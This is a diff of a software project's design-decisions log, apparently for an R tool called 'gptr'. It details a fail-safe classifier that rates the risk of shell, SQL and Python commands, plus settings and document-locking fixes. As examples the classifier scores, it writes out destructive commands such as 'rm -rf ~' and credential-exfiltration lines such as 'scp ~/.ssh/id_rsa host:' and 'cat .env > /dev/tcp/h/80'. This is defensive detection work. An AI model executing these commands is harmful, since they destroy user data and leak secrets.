@@ -2919,7 +2919,7 @@ first added block and a third added block (4); against the round-0 source they f
 (`task1-fix1-red.log`). Final `^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 116 ]` in the
 UTF-8 and the C locale.
 
-## D-061 - P11 command, SQL and Python classifiers are fail-safe: a command line is read as bash and as sh read it (comments, heredocs, ANSI-C quotes, brace expansion, redirect descriptors, backslashes, substitutions, cd, case), null devices, parameter defaults and shell-word paths are followed, a glob takes the class of the guarded names it can match, wrappers, eval, shell keywords and literal text fed to a shell never hide a command, program-running options and environment values are read as command lines, every write, every guarded operand of an unmodelled program and git's working-tree paths take their path class, a file a command reads takes its read level, a secret with a network sink is level 4, SQL is lexed in one pass per dialect and EXPLAIN takes the explained statement's level, text enters through as_utf8() (2026-10-04)
+## D-061 - P11 command, SQL and Python classifiers are fail-safe: a command line is read as bash and as sh read it (comments, heredocs, ANSI-C quotes, brace expansion, redirect descriptors, backslashes, substitutions, cd, case), null devices, parameter defaults and shell-word paths are followed, a glob takes the class of the guarded names it can match, wrappers, eval, shell keywords and literal text fed to a shell never hide a command, program-running options and environment values are read as command lines, every directory a cd can leave the shell in is read, every write, every guarded operand of an unmodelled program, a link's source and git's working-tree paths take their path class, deleting a top-level directory is level 4, a file a command reads takes its read level, a secret with a network sink (also from ssh, scp, rsync, /dev/tcp, SQL and environment dumps) is level 4, SQL is lexed in one pass per dialect and EXPLAIN takes the explained statement's level, SQL and Python writes to literal guarded paths take their class, Python's command lines, R calls and unpickling are read, text enters through as_utf8() (2026-10-04)
 
 P11 Task 2 appends the plan's G5 classifiers (`risk_command()`, `risk_sql()`, `risk_python()`, the
 flag-row helpers, `risk_path_class()`, `risk_cmd_row()`, `risk_cmd_edits_parity`) with the plan's
@@ -2942,8 +2942,9 @@ a critical, protected or control target, a command line it can read that is leve
 read on a line with a network sink. Where bash (macOS /bin/sh, Git Bash) and dash (Linux /bin/sh)
 read a line differently (brace expansion, a descriptor such as `10>`), both readings are
 classified and the higher counts; so are the Windows and the sh reading of a backslash, and the
-readings of a parameter default (round 4). Items 1-10 are the rounds 0-2 behaviour; item 11 lists
-what round 3 added and item 12 what round 4 added:
+readings of a parameter default (round 4), and every directory a `cd` can leave the shell in
+(round 5: it may fail). Items 1-10 are the rounds 0-2 behaviour; item 11 lists what round 3
+added, item 12 what round 4 added and item 13 what round 5 added:
 1. **Shell syntax.** Substitutions are found by a scan that follows quotes, backslashes and
    nesting, and each is classified as a command line, recursively (the plan read one level with a
    regular expression: `echo $(rm -rf ~ $(true))` was 0), process substitutions `<(...)`/`>(...)`
@@ -3245,13 +3246,108 @@ what round 3 added and item 12 what round 4 added:
     - *Python.* `.unlink(`/`.rmdir(` after any expression (`Path('x').unlink()`),
       `asyncio.create_subprocess_shell`/`_exec` (also imported or aliased), `os.kill` and
       `os.killpg` were 1, now 3.
+13. **Review round 5 (fail-safe).**
+    - *Links.* A link names its source a second time, and a write or a delete through it reaches
+      the source, so the sources of `ln` and of `cp -s`/`-l`/`--link`/`--symbolic-link` are read
+      as mv's are: control, critical or protected, or a wipe (home, `/`, a top-level directory)
+      is 4, an instructions file or a source gptr cannot name 3; a link outside the project keeps
+      the link's own level (`ln -s ../data data` is 2). `ln .gptr/settings.json s` (a hard link,
+      which P01's `path_class()` cannot see in a later call), `ln -s ~ h && rm -rf h/` and
+      `ln -sf .gptr/settings.json s && echo '{}' > s` were 2 or 3, now 4. A link the line makes
+      also names its source for the rest of the line: the commands after it are read again with
+      the source in place of the link (`ln -s /etc/hosts h && echo x >> h` was 2, now 3).
+      `mklink` and `New-Item -ItemType *Link` reach the source through item 11's guarded operands.
+    - *Working directories.* The walker keeps every directory a command can run in: a `cd` may
+      fail, so the commands after it can also run where the shell was, except in the `&&` chain
+      it starts or when `|| exit`/`|| return` follows it (`cd build; rm -rf *`,
+      `if [ -d x ]; then cd x; fi; rm -rf *`, `f() { cd /tmp; }; rm -rf *` were 3, now 4 like
+      `rm -rf *`; `cd build && rm -rf *` and `cd build || exit 1; rm -rf *` stay 3). The
+      tokeniser now emits `&&` and `||` as their own operators. A `cd` after prefix assignments,
+      `time` (and `-p`), `builtin`, `noglob` or `command` counts (`X=1 cd .gptr && touch mcp.json`,
+      `time cd .gptr && ...` were 2, now 4). CDPATH from the environment, from the command's
+      prefix or from an assignment or export earlier on the line adds the operand under each
+      entry when it is relative and does not start with `.` or `..`
+      (`export CDPATH=.gptr; cd plugins && touch x` was 2, now 4). `eval`, `source`, `.` and
+      `alias` add an unknown directory (item 11's reading from the root and its `.gptr/`):
+      `eval cd .gptr && touch mcp.json` and `source env.sh && touch mcp.json` were 3, now 4. A
+      substitution after any of these words also runs in the line's first directory. More than
+      six directories are read as an unknown one. An extra reading adds rows: the redirect of
+      `(cd .gptr; echo x > settings.json)` has a `control` row and a `workspace` row (the test
+      now checks that `control` is among them).
+    - *SQL and Python writes.* A SQL statement of level 2 or more other than table DML (INSERT,
+      UPDATE, DELETE, MERGE, UPSERT, REPLACE, WITH ... DML: their values are rows, not paths) and
+      COPY ... FROM (a read) writes the guarded paths its string literals name ('...', "...",
+      dollar quotes), at their write level with the statement's call text: `COPY orders TO
+      '.Rprofile'`, `EXPORT DATABASE '.gptr'`, `ATTACH '.gptr/settings.json' AS x`, `VACUUM INTO`,
+      `SELECT ... INTO OUTFILE` were 3 or 2, now 4. SQLite's `writefile()` and Postgres's
+      `lo_export()` and adminpack writers make a statement at least 3 (they were 0). Python code
+      with a write or delete row writes the guarded paths its string literals name (comments
+      skipped): `open('.Rprofile', 'w')`, `df.to_csv('.gptr/settings.json')`,
+      `shutil.copy('x', '.gptr/settings.json')` were 2, now 4; a deleted control, critical or
+      protected path or a wipe is 4 (`shutil.rmtree(os.path.expanduser('~'))`). `open()` with
+      nested parentheses and the `r+` mode is a write. Relative paths resolve from the project
+      root and from R's working directory.
+    - *Secrets that reach the network.* An unmodelled program (item 11) also reads its operands
+      and option values (a secret file's contents are a 3 `secret` read), and a URL operand is a
+      2 `network` row; aws, gsutil, gcloud, az, azcopy, rclone, s3cmd, gh, glab, socat, ncat,
+      netcat, lftp, ssh-copy-id, sendmail, mail, mailx and mutt are network programs. scp, sftp
+      and rsync read their operands, not their option values (`-i KEY` authenticates; ssh's own
+      operands are its host and command line); `rsync -e`/`--rsh`, `scp -S`, `sftp -S`/`-D` and an
+      `-o ProxyCommand`/`LocalCommand`/`KnownHostsCommand` are command lines run here. An sftp or
+      ftp batch on standard input reads the local files it names and runs its `!` lines. A
+      redirect to bash's `/dev/tcp/` or `/dev/udp/` is a network row (3, a read 2). `git add`
+      reads its files (a push on the line sends them). `risk_sql()` applies the secret-sink rule.
+      `scp ~/.ssh/id_rsa host:`, `base64 .env | curl -d @- ...`, `cat .env > /dev/tcp/h/80`,
+      `git add .env && git commit -m x && git push`, `aws s3 cp .env s3://x` and
+      `COPY (SELECT content FROM read_text('.env')) TO 's3://...'` were 3, now 4;
+      `ssh -i ~/.ssh/id_rsa host ls` stays 3.
+    - *Top-level directories.* 03 section 6.8.1 and report 18's verification log (row 33) make
+      deleting a top-level directory level 4: `risk_cmd_wipes()` is true for a path one component
+      below `/` or a drive root (also macOS's `/private/x`), as written or resolved, and for a
+      glob that matches every name in one (`rm -rf /usr/*`, `rm -rf /tmp/*`); a glob in `/` or a
+      drive root can name the usual top-level names and those that exist (`rm -rf /???`).
+      `rm -rf /etc`, `rm -rf /Applications`, `rd /s /q C:\Windows`, `mv /etc /tmp/x`,
+      `find /usr -delete` were 3, now 4; `rm -rf /tmp/gptr-x` and `mv /etc/gptr-test.conf .` stay
+      3. cmd's switches (`rd /s`, `del /f`) are no paths.
+    - *printf -v.* `printf -v NAME` assigns as a prefix assignment does (`printf -v PATH %s
+      /tmp/x; ls` was 0, now 3; `printf -v PAGER %s 'rm -rf ~'` 4); a computed NAME is 3
+      `dynamic`; `printf -v x %s 1` stays 0.
+    - *Python.* Calls into R (`r.f(...)`, `r['f'](...)`, `getattr(r, ...)`, rpy2's `.r(...)`)
+      are 3 `dynamic` unless the code binds the name `r` itself; ctypes, cffi, runpy, `code`'s
+      interpreters and unpickling (pickle, marshal, dill, shelve, joblib, `read_pickle`) are 3
+      `dynamic`; `os.startfile`, `platform.popen`, multiprocessing and webbrowser 3 `process`
+      (all were 1). A URL literal is a 2 `network` read; a literal path takes its read level, a
+      secret file's 3 `secret`, which counts for the secret-sink rule
+      (`requests.post(u, data=open('.env').read())` was 3, now 4). The literal command line or
+      argv of os.system, os.popen, os.exec*, os.spawn*, subprocess.*, Popen, check_output,
+      check_call, getoutput and create_subprocess_* is classified as a command
+      (`os.system('rm -rf ~')` was 3, now 4).
+    - *Environment dumps.* jq's `env`/`$ENV` (and a `-f` program), awk's `ENVIRON` (by a computed
+      name, or a secret-looking literal one; a `-f` program too), `declare`/`typeset` without
+      names (`-p`, `-x`), ps's `e` and `-E`, and the environment reads of an interpreter's `-c`/
+      `-e` code (`os.environ`, `Sys.getenv()`, `process.env`, `%ENV`, `ENV`, `getenv()`) are 2
+      `secret` reads of `$ENV` that the secret-sink rule counts (`jq -n env | curl -d @- ...` was
+      3, now 4; `jq -n env` and `ps eww` were 0, now 2).
+    - *Interpreter code* (self-review). The `-c`/`-e` code of an interpreter other than a shell
+      is read for secret-file literals; Python's is classified as `risk_python()` classifies
+      gptr$py code, and the first literal argument of system(), exec*(), spawn*(), popen(),
+      shell_exec() and the like, and Perl's, Ruby's and PHP's backticks, are command lines
+      (`perl -e 'system("rm -rf ~")'`, `Rscript -e 'system("rm -rf ~")'` were 3, now 4).
+    - Changed rows: raised `import os as o; o.system('rm -rf ~')` from 3 to 4 (its command line is
+      read); the `(cd .gptr; ...)` redirect check accepts the extra failed-cd row. No row was
+      lowered.
 Known limits (advisory classifier, not a security boundary; each is level 3 or the level of what
 can be read, never 0): scripts read by `sed -f`/`awk -f`, `source FILE` or `sh FILE`,
 configuration read by `curl -K`, `wget -e`/`--config` (3 `dynamic` since round 4) or `git` from
 the repository, the values of variables and positional parameters (`$X`, `"$@"`: `unknown`), commands hidden by `eval` of
-computed strings beyond the rules above, Python reached through other indirections, SQL functions
-with side effects inside a SELECT, and heredocs or here-strings read by a program other than a
-shell, `source` or xargs (an interpreter is 3 `process` anyway). A substitution in an unquoted
+computed strings beyond the rules above, Python reached through other indirections (an alias of
+`r`, a process call whose command is built at run time), SQL functions with side effects inside a
+SELECT other than the file writers above, and heredocs or here-strings read by a program other
+than a shell, `source`, xargs, sftp or ftp (an interpreter is 3 `process` anyway). `set -e` and
+`if cd x; then ...` are not modelled: a `cd` there is read as one that may fail (a higher level,
+never a lower one). A link made by `mklink` or `New-Item` is not followed on the line (its
+guarded source is flagged). CDPATH set by a file the shell sources is read only through the
+unknown directory that `source` adds. A substitution in an unquoted
 heredoc that holds a comment is not read and is level 3 `dynamic`. Shell syntax is read as bash
 and dash read it (and PowerShell, for `#` comments); cmd.exe, gptr's last fallback on Windows
 without Git Bash or PowerShell, has no `'` quotes, no `#` comments and `^` escapes, which the
@@ -3272,8 +3368,11 @@ blocks (109 expectations); the first 103 fail 70 against the round-1 source
 first 142 new expectations and the first changed row fail 94 against the round-2 source
 (`task2-fix3-red.log`). Review round 4 added item 12 and the amendments it names, with six blocks
 (150 expectations), two path checks in older blocks and two raised rows (the `gawk -f` rows: 2 to
-3); the final test file fails 101 against the round-3 source (`task2-fix4-red-final.log`). Final
-`^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 888 ]` in the UTF-8 and the C locale.
+3); the final test file fails 101 against the round-3 source (`task2-fix4-red-final.log`). Review
+round 5 added item 13, with nine blocks (232 expectations), one raised row and one changed
+assertion; the final test file fails 157 against the round-4 source (`task2-fix5-red-final.log`).
+Final `^perm-classify$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 1124 ]` in the UTF-8 and the C
+locale.
 
 ## D-062 - P15 block headers: values holding a line break are quoted, quoted values are decoded without the R parser, header keys are matched exactly, a local model tag is kept as written (2026-10-04)
 
@@ -5519,7 +5618,7 @@ count for `test-cli-common.R` is 17 higher on macOS and Linux (Task 2 red
 `[ FAIL 5 | WARN 0 | SKIP 0 | PASS 43 ]`, and so on); on Windows the execute-bit test skips, so
 counts there are 14 higher plus `SKIP 1`.
 
-## D-094 - P08 settings layers: project files and options() never relax providers.<id>.local_only, a project base URL needs trust and a one-time confirmation, dotted names merge at every level, user-scope settings come from the user file only, an explicit null in a file is a value, keys without a spec keep their option default, and the printed settings are redacted (2026-10-04)
+## D-094 - P08 settings layers: project files and options() never relax providers.<id>.local_only, a project base URL needs trust and a one-time confirmation, dotted names merge at every level, user-scope settings come from the user file only, an explicit null in a file is a value, keys without a spec keep their option default, the printed settings are redacted, and a registered setting spec cannot redefine providers or egress (2026-10-04)
 
 P08 Task 3's literal settings layers (`R/gptr-config.R`) predate IC-74 and leave out two contract
 rules. Behaviours that differ from the plan literal, which Task 4 (egress), Task 7
@@ -5549,10 +5648,15 @@ and P07 consume:
 3. **Dotted names merge at every level.** The plan resolved a dotted key inside its object and
    then let the option and session entry of that exact name replace it, so
    `gptr.providers.ollama` never reached `providers.ollama.local_only` and the dotted value
-   replaced an object instead of merging into it. `settings_resolve()` now merges the option, then
-   the session entry, of each dotted name from the object down to the key (less specific first,
-   objects merged key by key, contract 11.2), through `settings_guard()`; the source becomes that
-   layer only when its contribution reaches the key.
+   replaced an object instead of merging into it. The plan's dotted option also overrode the
+   session layer's object, against contract 11.2's order `options(gptr.*)` <
+   `gptr_config(.scope = "session")`. `settings_layered(key, path)` now builds the option layer
+   from `gptr.<key>` and then the option of each dotted name from the object down to the key, and
+   the session layer the same way above it (less specific first, objects merged key by key,
+   through `settings_guard()`), so `gptr.subagents.max_depth = 0` does not undo a session
+   `subagents = list(max_depth = 2)`. The source is the highest layer whose contribution reaches
+   the key (for the project file: changes it); a contribution the guard empties is no
+   contribution, and a provider entry the guard emptied is dropped.
 4. **`scope = "user"` settings come from the user file only.** The plan returned early for the
    literal key `egress`; the dotted read `egress.<id>` still took `gptr.egress.<id>` and the
    session entry. Every setting whose spec has `scope = "user"` (the core `egress`, and plugin
@@ -5574,8 +5678,20 @@ and P07 consume:
    `<class>`.
 8. **A legacy `.gptr/settings.local.json` whose `permissions` is not an object is ignored**
    instead of failing the read (`$` on an atomic value).
+9. **A registered `setting` spec cannot redefine `providers` or `egress` (IC-74; 07 section 5:
+   extensions cannot relax `local_only`; contract 11.2: `egress` from the user file only).** The
+   plan resolved a registered dotted key by itself and took every key's default and scope from
+   the winning registered spec, so an extension registering `providers.ollama.local_only` (or a
+   `providers` spec whose default held `local_only = FALSE`, or an `egress` spec with
+   `scope = "both"`) relaxed the protected value or let options and projects acknowledge egress.
+   `settings_spec()` now returns the core table entry for these two keys, a dotted key below them
+   always resolves inside the object, the default passes `settings_guard()`, and
+   `settings_local_only()` reads the core `providers` object directly.
 
-Validation: `progress/P08.md`, Task 3. `^gptr-config$`: red `[ FAIL 16 | WARN 0 | SKIP 0 | PASS 154 ]`
+Validation: `progress/P08.md`, Task 3. Review round 1 (items 3 and 9): red
+`[ FAIL 18 | WARN 0 | SKIP 0 | PASS 244 ]` (`task3-fix1-red.log`), green
+`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 262 ]` (`task3-fix1-green.log`); the service-active probe
+passes 4288 (`task3-fix1-probe-service-active.log`). Before review: `^gptr-config$`: red `[ FAIL 16 | WARN 0 | SKIP 0 | PASS 154 ]`
 (the plan's seven tests and eight adaptation tests, all on missing functions or the missing
 `settings.get` entry), green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 238 ]` (plan 79, which is 178 after
 D-091 and D-092; the adaptation tests add 60). Against the plan-literal layers (plus the same
@@ -5622,6 +5738,57 @@ plan-literal source `[ FAIL 7 | WARN 0 | SKIP 0 | PASS 78 ]`
 it); final `^cli-common$`
 `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 99 ]` (`task2-fix1-green.log`), so every later plan count
 for `test-cli-common.R` is 40 higher on macOS and Linux (17 from D-093, 23 from this entry).
+
+## D-096 - P15 document I/O: a document lock that is gone or being released is not stale, a lock is never left without its pid file, NUL bytes are an encoding refusal and a directory a missing document, the md5 is taken before the bytes are read, mixed line endings keep the majority ending, and a record map that is not an object is replaced (2026-10-04)
+
+P15 Task 4's literal `R/doc-io.R` (plan lines 2061-2321) is implemented with six changes. Each
+is pinned by a test under "Task 4 adaptations" in `tests/testthat/test-doc-io.R`, and each of
+those tests fails against the plan literal:
+
+1. **A lock being released is not stale (IC-71; D-091 item 2 for document locks).**
+   `doc_lock_stale()` counted a lock directory that had vanished (`file.info()$mtime` is `NA`)
+   as stale, so `doc_lock_acquire()` could `unlink()` a lock that another process had just
+   taken. It also read the pid file after a `file.exists()` check, so an owner releasing the
+   lock in between made `read_utf8()`'s error escape from `doc_lock()`. A missing directory, an
+   unknown age or an unreadable pid file now counts as not stale, and the caller retries. An
+   empty lock directory older than 30 s, a dead pid and an unparsable pid still count as stale.
+   This is the rule of P08's `lock_stale()`, which L4 code cannot call.
+2. **A lock is never left without its pid file.** When writing the pid file fails after the
+   `mkdir`, the lock directory is removed before the error propagates. The plan left it in
+   place, which blocked the document for 30 s.
+3. **NUL bytes are `reason = "encoding"`; a directory is `"missing"`.** `rawToChar()` refuses
+   embedded NULs with a base error, so a UTF-16 document (or any NUL byte) escaped as a plain
+   error instead of `gptr_error_doc_write`. `readBin()` of a directory failed the same way.
+4. **The md5 is taken before the bytes are read.** The plan computed it after splitting the
+   lines. A change made between the read and the md5 became the recorded base, so the next
+   checked `doc_write()` overwrote it (contract 7.15's md5 conflict check). Such a change now
+   makes the next write a `conflict`. `doc_write()` keeps the plan's md5-after-write.
+5. **Mixed line endings keep the majority ending.** The plan wrote every line with CRLF as
+   soon as one CRLF occurred, so one block inserted into a mostly-LF file rewrote every line.
+   `doc_eol_of()` now picks CRLF only when at least as many lines end in CRLF as in a bare LF.
+   Pure CRLF files and ties behave as before. Lines in the minority ending are still
+   normalised.
+6. **A `record` value that is not a JSON object is replaced.** The plan extended it into
+   `{"1": ..., "<document>": ...}`.
+
+Not changed (a known limit; P08 decides): `settings_write()` merges top-level keys under its
+short lock. `doc_project_remember()` therefore reads the `record` map outside that lock (plan
+ambiguity 12). If two processes remember answers for different documents at the same moment,
+one answer can be lost, and that document's question is asked again. A nested patch in P08's
+`settings_write()` would close this gap. The file is the one P08's
+`settings_path("user_project")` names; a test pins this.
+
+Test-side (no behaviour change): the plan's "the byte fixtures round-trip exactly" called
+`testthat::test_path()` after `local_project()` had changed the working directory, so the
+relative fixture path no longer resolved and `file.copy()` failed silently. The paths are now
+resolved first, and the copy is asserted. Later tasks that extend `test-doc-io.R` (10, 11, 18)
+must resolve fixture paths before `local_project()` in the same way.
+
+Validation: `progress/P15.md`, Task 4. Red (no source) `[ FAIL 15 | WARN 0 | SKIP 0 | PASS 1 ]`.
+The plan literal gives `[ FAIL 10 | WARN 0 | SKIP 0 | PASS 58 ]`: every failure is in the six
+adaptation tests (`dev/.validation/P15/task4-adapt-red.log`). Green: `^doc-io$`
+`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 73 ]`, the same under `LC_ALL=C`. The plan expects 41; the
+difference is 1 asserted copy, 6 for the gptr_source() frame test and 25 for the adaptations.
 
 ## D-097 - P20 status and model entries: codex/default is a model the Codex route lists, status(check = TRUE) runs the capability probe, and a malformed rate_limit_event reads as NA (2026-10-04)
 
